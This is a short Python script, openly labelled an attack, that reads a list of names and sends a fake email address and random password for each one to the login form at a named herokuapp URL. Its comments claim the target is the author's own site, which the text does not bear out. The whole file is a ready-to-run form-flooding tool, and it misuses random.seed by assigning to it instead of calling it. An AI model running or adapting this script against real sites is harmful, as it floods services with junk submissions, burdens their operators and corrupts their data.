import requests
import os
import random
import json
import string
from random import randint

chars = string.ascii_letters + string.digits + '!@#$%^&*()'
random.seed = (os.urandom(1024))

url = 'https://massivelogin.herokuapp.com/'

# Puts the json file of names into a list
names = json.loads(open('names.json').read())

# Starts the attack on my own website
print('Starting the attack.......')
# Going through every name in the json file
for name in names:
	name_extra = ''.join(random.choice(string.digits))

	value = randint(0, 2)
	username = ''
	# If the random value equates to either of these values, the username will change slightly
	if value == 0:
		username = name.lower() + name_extra + '@mail.com'
	elif value == 1:
		username = name.lower() + name_extra + '@outlook.com'
	else:
		username = name.lower() + name_extra + '@gmail.com'
	
	password = ''.join(random.choice(chars) for i in range(8))

	# Requests needs the url, and the data is the fields
	requests.post(url, allow_redirects=False, data={
			'usernameField': username,
			'passwordField': password
	})
	print ('Currently Sending username: %s & Password: %s' % (username, password))
# Meesage to indicate the attack has ended
print('Attack has ended........')